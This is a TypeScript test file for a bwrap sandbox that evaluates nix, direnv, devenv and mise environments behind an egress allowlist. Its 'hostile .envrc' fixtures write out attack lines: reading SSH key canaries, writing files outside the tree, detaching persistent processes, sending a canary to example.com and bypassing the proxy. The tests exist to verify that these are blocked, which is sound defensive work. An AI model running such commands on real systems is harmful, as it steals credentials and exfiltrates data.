import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import {
	decodeDirenvWatches,
	parseDirenvExport,
	parseMiseEnv,
	parseNixDevEnv,
	watchedRepoPaths,
} from "../src/containment/dev-env-capture.ts";
import {
	ENV_BUILD_EGRESS,
	envBuildAllowlist,
} from "../src/containment/dev-env-egress.ts";
import {
	bwrapSkipReason,
	createEnvLab,
	type EnvLab,
	flakeLockText,
	nixSkipReason,
	pinnedNixpkgs,
	tinyFlake,
	toolSkipReason,
} from "./support/dev-env-fixture.ts";
import { liveGate } from "./support/live-gate.ts";

/**
 * The env-build sandbox under real bwrap, through the real compile, probe,
 * gate and launch, with the real per-run proxy and the host's nix daemon.
 * Only the systemd layer is a stand-in (caged-launch.ts): the task and memory
 * limits are NOT exercised here.
 */

const skip =
	liveGate("dev-env-build-live", bwrapSkipReason()) ??
	liveGate("dev-env-build-live", nixSkipReason(), "nix");
const noDirenv = liveGate(
	"dev-env-build-live direnv",
	toolSkipReason(["direnv", "bash"]),
	"nix",
);
const noMise = liveGate(
	"dev-env-build-live mise",
	toolSkipReason(["mise"]),
	"nix",
);
const noDevenv = liveGate(
	"dev-env-build-live devenv",
	toolSkipReason(["devenv"]),
	"nix",
);

describe.skipIf(skip !== null)("evaluating a dev environment", () => {
	let lab: EnvLab;
	beforeAll(() => {
		lab = createEnvLab("env-build");
	});
	afterAll(() => lab.dispose());

	test("a plain flake devShell: nix print-dev-env in the sandbox", async () => {
		const { root, commit } = await lab.repo("flake", {
			"flake.nix": tinyFlake(),
			"flake.lock": flakeLockText(),
		});
		const r = await lab.run(root, commit, {
			step: "flake",
			allow: envBuildAllowlist(),
		});
		if (!r.ok) console.log(r.reason, r.fix, r.log);
		expect(r.ok).toBe(true);
		const out = JSON.parse(r.ok ? r.output.toString() : "{}");
		expect(out.variables.FIXTURE_FLAKE.value).toBe("yes");
		lab.assertCanaries();
	}, 300_000);

	test.skipIf(noDirenv !== null)(
		"direnv: use flake, dotenv, source_env, PATH_add, layout and watch_file",
		async () => {
			const { root, commit } = await lab.repo("direnv", {
				"flake.nix": tinyFlake(),
				"flake.lock": flakeLockText(),
				".envrc": [
					"use flake",
					"dotenv",
					"source_env sub/extra.envrc",
					"PATH_add bin",
					"layout node",
					"watch_file watched.txt",
					"export FIXTURE_DIRENV=yes",
					"",
				].join("\n"),
				".env": "FROM_DOTENV=1\n",
				"sub/extra.envrc": "export FROM_SOURCED=1\n",
				"watched.txt": "w\n",
				"bin/local-tool": "#!/bin/sh\necho local\n",
			});
			const r = await lab.run(root, commit, {
				step: "direnv",
				allow: envBuildAllowlist(),
			});
			if (!r.ok) console.log(r.reason, r.log);
			expect(r.ok).toBe(true);
			if (!r.ok) return;
			const env = parseDirenvExport(r.output.toString());
			expect(env.FIXTURE_DIRENV).toBe("yes");
			expect(env.FIXTURE_FLAKE).toBe("yes");
			expect(env.FROM_DOTENV).toBe("1");
			expect(env.FROM_SOURCED).toBe("1");
			const path = (env.PATH ?? "").split(":");
			expect(path).toContain("/work/bin");
			expect(path).toContain("/work/node_modules/.bin");
			expect(
				path.some((p) => /^\/nix\/store\/[^/]+-hello-[^/]+\/bin$/.test(p)),
			).toBe(true);
			expect(watchedRepoPaths(decodeDirenvWatches(env.DIRENV_WATCHES))).toEqual(
				[
					".env",
					".envrc",
					"flake.lock",
					"flake.nix",
					"sub/extra.envrc",
					"watched.txt",
				],
			);
			// direnv's own allow record went to the sandbox's private home.
			expect(existsSync(join(lab.home, ".local/share/direnv"))).toBe(false);
			lab.assertCanaries();
		},
		300_000,
	);

	test.skipIf(noDevenv !== null)(
		"devenv: devenv print-dev-env in the sandbox",
		async () => {
			const rev = (pinnedNixpkgs().locked as { rev: string }).rev;
			const { root, commit } = await lab.repo("devenv", {
				"devenv.nix":
					'{ pkgs, ... }: { packages = [ pkgs.hello ]; env.FROM_DEVENV = "1"; }\n',
				"devenv.yaml": `inputs:\n  nixpkgs:\n    url: github:NixOS/nixpkgs/${rev}\n`,
			});
			const r = await lab.run(root, commit, {
				step: "devenv",
				allow: envBuildAllowlist(),
				timeoutMs: 500_000,
			});
			if (!r.ok) console.log(r.reason, r.log);
			expect(r.ok).toBe(true);
			if (!r.ok) return;
			const env = parseNixDevEnv(r.output.toString());
			expect(env.FROM_DEVENV).toBe("1");
			expect(env.PATH).toMatch(/-hello-[^/:]+\/bin/);
			// devenv asks its binary caches itself; refused, the evaluation still works.
			for (const host of Object.keys(r.egress?.allowed ?? {})) {
				expect([
					"github.com:443",
					"codeload.github.com:443",
					"api.github.com:443",
				]).toContain(host);
			}
		},
		590_000,
	);

	test.skipIf(noMise !== null)(
		"mise: trust and install into the sandbox-owned data directory",
		async () => {
			const { root, commit } = await lab.repo("mise", {
				"mise.toml": '[tools]\njq = "1.7.1"\n\n[env]\nFROM_MISE = "1"\n',
			});
			const dataDir = join(lab.mfwHome, "env", "data", "mise-fixture");
			const r = await lab.run(root, commit, {
				step: "mise",
				allow: envBuildAllowlist(),
				dataDir,
			});
			if (!r.ok) console.log(r.reason, r.log);
			expect(r.ok).toBe(true);
			if (!r.ok) return;
			const env = parseMiseEnv(r.output.toString());
			expect(env.FROM_MISE).toBe("1");
			expect((env.PATH ?? "").split(":")[0]).toBe(
				"/cache/env-data/mise/installs/jq/1.7.1",
			);
			expect(existsSync(join(dataDir, "mise/installs/jq/1.7.1/jq"))).toBe(true);
			// Host-observed: every host reached is a recorded mise entry, none was
			// refused, and the index and the release download were reached. Not
			// the exact set: which extra hosts mise asks changes between mise
			// versions (2026.6.5 also asks api.github.com), and an unrecorded one
			// fails the subset check, so dev-env-egress.ts stays the record.
			const miseHosts = ENV_BUILD_EGRESS.filter((e) =>
				e.purpose.startsWith("mise-"),
			).map((e) => `${e.host}:${e.port}`);
			const reached = Object.keys(r.egress?.allowed ?? {});
			for (const host of reached) expect(miseHosts).toContain(host);
			expect(reached).toEqual(
				expect.arrayContaining([
					"github.com:443",
					"mise-versions.jdx.dev:443",
					"release-assets.githubusercontent.com:443",
				]),
			);
			expect(r.egress?.denied).toEqual({});
			expect(existsSync(join(lab.home, ".config/mise"))).toBe(false);
			expect(existsSync(join(lab.home, ".local/share/mise"))).toBe(false);
		},
		300_000,
	);
});

describe.skipIf(skip !== null || noDirenv !== null)("a hostile .envrc", () => {
	let lab: EnvLab;
	beforeAll(() => {
		lab = createEnvLab("env-hostile");
	});
	afterAll(() => lab.dispose());

	// The hostile tests' own deadline, well under their test timeout, so a run
	// that is not stopped fails fast through lab.run's guard, naming its phase.
	const HOSTILE_DEADLINE_MS = 60_000;
	const HOSTILE_TEST_MS = 120_000;

	/**
	 * Starts its command fully detached, the way a daemon does: std streams on
	 * /dev/null and every other inherited descriptor closed. direnv runs the
	 * .envrc with a pipe on fd 3 and some direnv versions (2.37) wait for it to
	 * close, so a job that kept it would hold the evaluation until its
	 * deadline; that case has its own test below.
	 */
	const DETACH = `detach() { ( for p in /proc/$BASHPID/fd/*; do n=\${p##*/}; [ "$n" -gt 2 ] && eval "exec $n>&-"; done; exec "$@" ) </dev/null >/dev/null 2>&1 & }`;

	const collect =
		(into: Record<string, string>, names: string[]) => async (tree: string) => {
			for (const n of names) {
				const p = join(tree, n);
				if (existsSync(p)) into[n] = readFileSync(p, "utf8").trim();
			}
		};

	test(
		"positive control: it can write its tree and reach an allowlisted host",
		async () => {
			const { root, commit } = await lab.repo("positive", {
				".envrc": [
					"echo mine > /work/wrote",
					'bun -e \'const r = await fetch("https://github.com/"); await Bun.write("/work/net", String(r.status < 400))\' >/dev/null 2>&1',
					"export POSITIVE=1",
					"",
				].join("\n"),
			});
			const seen: Record<string, string> = {};
			const r = await lab.run(root, commit, {
				step: "direnv",
				allow: envBuildAllowlist(),
				timeoutMs: HOSTILE_DEADLINE_MS,
				collectTree: collect(seen, ["wrote", "net"]),
			});
			if (!r.ok) console.log(r.reason, r.log);
			expect(r.ok).toBe(true);
			expect(seen).toEqual({ wrote: "mine", net: "true" });
			expect(r.ok && parseDirenvExport(r.output.toString()).POSITIVE).toBe("1");
			expect(Object.keys(r.egress?.allowed ?? {})).toContain("github.com:443");
		},
		HOSTILE_TEST_MS,
	);

	test(
		"it cannot read the home, write outside, keep a process or exfiltrate",
		async () => {
			const { root, commit } = await lab.repo("hostile", {
				".envrc": "",
			});
			const dataDir = join(lab.mfwHome, "env", "data", "hostile");
			const { root: hostileRoot, commit: hostileCommit } = await lab.repo(
				"hostile2",
				{
					".envrc": [
						`cat "${lab.canaries.ssh}" > /work/stolen 2>/dev/null || echo blocked > /work/read`,
						'cat "$HOME/.ssh/id_canary" >> /work/stolen 2>/dev/null || true',
						`( echo x > "${root}/pwned" ) 2>/dev/null; ( echo x > "${lab.home}/pwned" ) 2>/dev/null`,
						"( echo x > /nix/store/pwned ) 2>/dev/null; ( echo x > /etc/pwned ) 2>/dev/null",
						DETACH,
						"date +%s%N > /cache/env-data/heartbeat",
						"detach sh -c 'while :; do date +%s%N > /cache/env-data/heartbeat; sleep 0.2; done'",
						"detach bun -e 'Bun.serve({ port: 8099, fetch: () => new Response(\"x\") })'",
						"for i in $(seq 1 64); do detach sleep 300; done",
						'bun -e \'try { const r = await fetch("https://example.com/?d=canary"); await Bun.write("/work/exfil", r.status < 400 ? "reached" : "blocked " + r.status) } catch { await Bun.write("/work/exfil", "blocked") }\' >/dev/null 2>&1',
						'env -u https_proxy -u HTTPS_PROXY -u http_proxy -u HTTP_PROXY -u ALL_PROXY -u all_proxy bun -e \'try { await fetch("https://1.1.1.1/"); await Bun.write("/work/direct", "reached") } catch { await Bun.write("/work/direct", "blocked") }\' >/dev/null 2>&1',
						"export HOSTILE=done",
						"",
					].join("\n"),
				},
			);
			void commit;
			const seen: Record<string, string> = {};
			const r = await lab.run(hostileRoot, hostileCommit, {
				step: "direnv",
				allow: envBuildAllowlist(),
				dataDir,
				timeoutMs: HOSTILE_DEADLINE_MS,
				collectTree: collect(seen, ["stolen", "read", "exfil", "direct"]),
			});
			if (!r.ok) console.log(r.reason, r.log);
			expect(r.ok).toBe(true);
			expect(seen.stolen ?? "").toBe("");
			expect(seen.read).toBe("blocked");
			expect(seen.exfil).toStartWith("blocked");
			expect(seen.direct).toBe("blocked");
			expect(Object.keys(r.egress?.denied ?? {})).toContain("example.com:443");
			lab.assertCanaries();
			for (const p of [
				join(root, "pwned"),
				join(lab.home, "pwned"),
				"/nix/store/pwned",
			]) {
				expect(existsSync(p)).toBe(false);
			}
			// Nothing it started outlives the sandbox.
			const beat = join(dataDir, "heartbeat");
			const before = existsSync(beat) ? readFileSync(beat, "utf8") : "";
			expect(before).not.toBe("");
			await Bun.sleep(1200);
			expect(existsSync(beat) ? readFileSync(beat, "utf8") : "").toBe(before);
		},
		HOSTILE_TEST_MS,
	);

	test(
		"a process that keeps direnv's pipe open ends with the step, by its deadline",
		async () => {
			const dataDir = join(lab.mfwHome, "env", "data", "holder");
			const { root, commit } = await lab.repo("holder", {
				".envrc": [
					"date +%s%N > /cache/env-data/heartbeat",
					"( while :; do date +%s%N > /cache/env-data/heartbeat; sleep 0.2; done ) >/dev/null 2>&1 </dev/null &",
					"export HOLDER=1",
					"",
				].join("\n"),
			});
			const started = Date.now();
			const r = await lab.run(root, commit, {
				step: "direnv",
				allow: envBuildAllowlist(),
				dataDir,
				timeoutMs: 10_000,
			});
			if (!r.ok) console.log(r.code, r.reason, r.log);
			// direnv 2.37 waits for the pipe and the deadline stops the step;
			// direnv 2.38 returns at once. Either way the step ends in bounded time
			// and the process it left behind does not survive it.
			if (r.ok) {
				expect(parseDirenvExport(r.output.toString()).HOLDER).toBe("1");
			} else {
				expect(r.code).toBe("timed_out");
			}
			expect(Date.now() - started).toBeLessThan(40_000);
			const beat = join(dataDir, "heartbeat");
			const before = existsSync(beat) ? readFileSync(beat, "utf8") : "";
			expect(before).not.toBe("");
			await Bun.sleep(1200);
			expect(existsSync(beat) ? readFileSync(beat, "utf8") : "").toBe(before);
		},
		HOSTILE_TEST_MS,
	);

	test("a hanging .envrc is stopped at its deadline", async () => {
		const { root, commit } = await lab.repo("hang", {
			".envrc": "sleep 600\n",
		});
		const started = Date.now();
		const r = await lab.run(root, commit, {
			step: "direnv",
			allow: envBuildAllowlist(),
			timeoutMs: 4_000,
		});
		expect(r.ok).toBe(false);
		expect(!r.ok && r.code).toBe("timed_out");
		expect(Date.now() - started).toBeLessThan(60_000);
	}, 120_000);
});
